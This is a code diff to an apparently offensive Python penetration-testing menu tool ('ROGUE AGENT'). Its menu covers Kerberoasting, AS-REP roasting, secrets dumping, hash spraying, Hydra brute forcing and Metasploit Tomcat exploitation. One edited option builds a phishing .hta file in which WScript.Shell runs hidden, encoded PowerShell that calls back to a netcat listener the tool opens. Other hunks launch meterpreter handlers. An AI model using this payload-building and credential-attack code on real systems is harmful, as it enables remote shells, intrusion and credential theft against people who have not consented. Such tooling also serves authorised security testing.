@@ -196,7 +196,6 @@ def saveParams():
       config.write(DOM + "\n")
       config.write(SID + "\n")
       config.write(TSH + "\n")
-      config.write(LTM + "\n")
    return
    
 def privCheck(TGT):
@@ -558,9 +557,9 @@ def display():
    
 def options():
    print('\u2551' + "(01) Re/Set DNS  SERVER (12) Synchronize Time (23) Get Arch (34) WinLDAP Search (45) Kerberos Info (56) Domain Dump (67) Editor USER (78) Hydra  FTP (89) FTP      " + '\u2551')
-   print('\u2551' + "(02) Re/Set REMOTE   IP (13) Compile Exploits (24) Net View (35) Look up SecIDs (46) KerberoFilter (57) Blood Hound (68) Editor PASS (79) Hydra  SSH (90) SSH      " + '\u2551')
+   print('\u2551' + "(02) Re/Set REMOTE   IP (13) Compile Exploits (24) Net View (35) Look up SecIDs (46) Kerberos Auth (57) Blood Hound (68) Editor PASS (79) Hydra  SSH (90) SSH      " + '\u2551')
    print('\u2551' + "(03) Re/Set LIVE  PORTS (14) Start HTTPServer (25) Services (36) Sam Dump Users (47) KerberosBrute (58) BH ACL PAWN (69) Editor HASH (80) Hydra  WEB (91) SSHKeyID " + '\u2551')
-   print('\u2551' + "(04) Re/Set WEBSITE URL (15) Start SMB Server (26) AT  Exec (37) REGistry Hives (48) Kerberoasting (59) SecretsDump (70) Editor HOST (81) Hydra  SMB (92) Telnet   " + '\u2551')
+   print('\u2551' + "(04) Re/Set WEBSITE URL (15) Start SMB Server (26) AT  Exec (37) REGistry Hives (48) KerbeRoasting (59) SecretsDump (70) Editor HOST (81) Hydra  SMB (92) Telnet   " + '\u2551')
    print('\u2551' + "(05) Re/Set USER   NAME (16) WhoIs DNS SERVER (27) DCOMExec (38) Find EndPoints (49) ASREPRoasting (60) CrackMapExe (71) GenSSHkeyID (82) Hydra  POP (93) Netcat   " + '\u2551')
    print('\u2551' + "(06) Re/Set PASS   WORD (17) Dig   DNS SERVER (28) PS  Exec (39) Enum End Point (50) PASSWORD2HASH (61) PSExec HASH (72) GenListUser (83) Hydra  TOM (94) SQSH     " + '\u2551')
    print('\u2551' + "(07) Re/Set NTLM   HASH (18) Recon DNS SERVER (29) SMB Exec (40) RpcClient Serv (51) HASHS Sprayer (62) SmbExecHASH (73) GenListPass (84) MSF TOMCAT (95) MSSQL    " + '\u2551')
@@ -584,7 +583,7 @@ Yellow = '\e[1;93m'
 Reset  = '\e[0m'
 
 command("echo '" + Red + "'")
-command("xdotool key Alt+Shift+S; xdotool type 'ROGUE AGENT'; xdotool key Return"); time.sleep(1)
+command("xdotool key Alt+Shift+S; xdotool type 'ROGUE AGENT'; xdotool key Return")
 command("clear; cat " + dataDir + "/banner0.txt")
 command("echo '" + Yellow + "'")
 print("\t\t\t\t\t\t               T R E A D S T O N E  E D I T I O N                \n")
@@ -653,6 +652,7 @@ else:
 SKEW = 0                                  # TIME-SKEW SWITCH
 DOMC = 0                                  # DOMAIN SWITCH
 DNSC = 0                                  # DNS SWITCH
+HTTP = 0				  # HTTP SERVER PORT
 
 COL1 = 40                                 # MAX LEN SESSION DATA
 COL2 = 44                                 # MAX LEN SHARE NAME
@@ -686,7 +686,6 @@ if not os.path.exists(dataDir + "/config.txt"):
    DOM = "EMPTY              " 						                        # SESSION DOMAIN-NAME
    SID = "EMPTY              " 						                        # SESSION DOMAIN-SID
    TSH = "EMPTY              " 						                        # SESSIOM SHARE
-   LTM = "00:00              " 						                        # LOCAL TIME            # check if this is still required       
 else:
    print("[+] Configuration file found - restoring saved data....")
    DNS = linecache.getline(dataDir + "/config.txt", 1).rstrip("\n")
@@ -700,7 +699,6 @@ else:
    DOM = linecache.getline(dataDir + "/config.txt", 9).rstrip("\n")	
    SID = linecache.getline(dataDir + "/config.txt", 10).rstrip("\n")
    TSH = linecache.getline(dataDir + "/config.txt", 11).rstrip("\n")
-   LTM = linecache.getline(dataDir + "/config.txt", 12).rstrip("\n")    # LOCAL TIME            # check if this is still required
 
 DNS = spacePadding(DNS, COL1)
 TIP = spacePadding(TIP, COL1)
@@ -714,7 +712,6 @@ TGT = spacePadding(TGT, COL1)
 DOM = spacePadding(DOM, COL1)
 SID = spacePadding(SID, COL1)
 TSH = spacePadding(TSH, COL1)
-LTM = spacePadding(LTM, COL1)
 
 with open(dataDir + "/usernames.txt", "r") as read1, open(dataDir + "/hashes.txt", "r") as read2, open(dataDir + "/tokens.txt", "r") as read3, open(dataDir + "/shares.txt", "r") as read4:
    for x in range(0, maxUser):
@@ -1166,7 +1163,7 @@ while True:
             print("[+] Synchronised with remote server...\n")
             command("timedatectl set-time " + date)
             command("date --set=" + time)
-            LTM = spacePadding(time, COL1)
+            LTM = time
             SKEW = 1
          else:
             print("[-] Server synchronisation did not occur...")
@@ -1237,16 +1234,16 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '14':
-      checkParams = getPort()
+      HTTP = getPort()
       
-      if checkParams != 1:
-         print("[*] Starting HTTP server...")      
+      if HTTP != 1:
+         print("[*] Starting HTTP server...")
          command("xdotool key Ctrl+Shift+T")
-         command("xdotool key Alt+Shift+S; xdotool type 'HTTP SERVER'; xdotool key Return"); time.sleep(1)
-         command("xdotool type 'clear; cat " + dataDir + "/banner1.txt'; xdotool key Return"); time.sleep(1)
-         command("xdotool type 'python3 -m http.server --bind " + localIP + " " + checkParams + "'; xdotool key Return"); time.sleep(1)
+         command("xdotool key Alt+Shift+S; xdotool type 'HTTP SERVER'; xdotool key Return")
+         command("xdotool type 'clear; cat " + dataDir + "/banner1.txt'; xdotool key Return")
+         command("xdotool type 'python3 -m http.server --bind " + localIP + " " + HTTP + "'; xdotool key Return")
          command("xdotool key Ctrl+Tab")      
-      prompt()
+#      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1259,9 +1256,9 @@ while True:
    if selection == '15':
       print("[*] Starting SMB server...")
       command("xdotool key Ctrl+Shift+T")
-      command("xdotool key Alt+Shift+S; xdotool type 'SMB SERVER'; xdotool key Return"); time.sleep(1)
-      command("xdotool type 'clear; cat " + dataDir + "/banner2.txt'; xdotool key Return"); time.sleep(1)
-      command("xdotool type 'impacket-smbserver C:\\tmp " + httpDir + "/ -smb2support'; xdotool key Return"); time.sleep(1)
+      command("xdotool key Alt+Shift+S; xdotool type 'SMB SERVER'; xdotool key Return")
+      command("xdotool type 'clear; cat " + dataDir + "/banner2.txt'; xdotool key Return")
+      command("xdotool type 'impacket-smbserver C:\\tmp " + httpDir + "/ -smb2support'; xdotool key Return")
       command("xdotool key Ctrl+Tab")            
       prompt()
 
@@ -2859,35 +2856,31 @@ while True:
    if selection =='74':
       checkParams = getPort()
       
-      if checkParams != 1:
-         sPort = input("[*] Please specify http server port: ")
-
-         if sPort.isdigit():
-            print("[*] Creating .hta payload...")
-         else:
-            print("[-] Sorry, I did not understand " + sPort + "...")
-            checkParams = 1
+      if HTTP == 0:
+         print("[-] You need to start the HTTP server first...")
+         checkParams = 1
       
-      if checkParams != 1:             
+      if checkParams != 1:    
+
+         print("[*] Starting phishing server...")      
+         command("xdotool key Ctrl+Shift+T")
+         command("xdotool key Alt+Shift+S; xdotool type 'GONE PHISHING'; xdotool key Return")
+         command("xdotool type 'clear; cat " + dataDir + "/banner4.txt'; xdotool key Return")
+         command("xdotool type 'rlwrap nc -nvlp " + checkParams + "'; xdotool key Return")
+         command("xdotool key Ctrl+Tab")      
+      
          payLoad = f"""      
          a=new ActiveXObject("WScript.Shell");
          a.run("powershell -nop -w 1 -enc {powershell(localIP, checkParams)}", 0);window.close();
-         """.encode()
-            
+         """.encode()            
          bpayLoad = base64.b64encode(payLoad)
          final = encrypt(bpayLoad)
+         
          with open('payrise.hta', 'w') as hta:
             hta.write(body(final))
          
          print("[+] Exploit created, utilise the following code snippet to activate...")
-         print(colored("\nhttp://" + localIP + ":" + sPort + "/payrise.hta",colour6))
-      
-         print("\n[*] Starting phishing server...")      
-         command("xdotool key Ctrl+Shift+T")
-         command("xdotool key Alt+Shift+S; xdotool type 'GONE PHISHING'; xdotool key Return"); time.sleep(1)
-         command("xdotool type 'clear; cat " + dataDir + "/banner4.txt'; xdotool key Return"); time.sleep(1)
-         command("xdotool type 'rlwrap nc -nvlp " + checkParams + "'; xdotool key Return"); time.sleep(1)
-         command("xdotool key Ctrl+Tab")
+         print(colored("\nhttp://" + localIP + ":" + HTTP + "/payrise.hta",colour6))
           
       prompt()      
       
@@ -2956,9 +2949,9 @@ while True:
             print("[*] Starting phishing server...")
                    
             command("xdotool key Ctrl+Shift+T")
-            command("xdotool key Alt+Shift+S; xdotool type 'GONE PHISHING'; xdotool key Return"); time.sleep(1)
-            command("xdotool type 'clear; cat " + dataDir + "/banner4.txt'; xdotool key Return"); time.sleep(1)
-            command("xdotool type 'rlwrap nc -nvlp " + num + "'; xdotool key Return"); time.sleep(1)
+            command("xdotool key Alt+Shift+S; xdotool type 'GONE PHISHING'; xdotool key Return")
+            command("xdotool type 'clear; cat " + dataDir + "/banner4.txt'; xdotool key Return")
+            command("xdotool type 'rlwrap nc -nvlp " + num + "'; xdotool key Return")
             command("xdotool key Ctrl+Tab")      
                    
             if match == 1:
@@ -3285,8 +3278,8 @@ while True:
             write.write("run\n")
    
          command("xdotool key Ctrl+Shift+T")
-         command("xdotool key Alt+Shift+S; xdotool type 'METERPRETER TOMCAT'; xdotool key Return"); time.sleep(1)
-         command("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return"); time.sleep(1)
+         command("xdotool key Alt+Shift+S; xdotool type 'METERPRETER TOMCAT'; xdotool key Return")
+         command("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return")
          command("xdotool key Ctrl+Tab")      
       prompt()
 
@@ -3314,8 +3307,8 @@ while True:
             write.write("run\n")
 
          command("xdotool key Ctrl+Shift+T")
-         command("xdotool key Alt+Shift+S; xdotool type 'METERPRETER SHELL'; xdotool key Return"); time.sleep(1)
-         command("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return"); time.sleep(1)
+         command("xdotool key Alt+Shift+S; xdotool type 'METERPRETER SHELL'; xdotool key Return")
+         command("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return")
          command("xdotool key Ctrl+Tab")
       prompt()
 
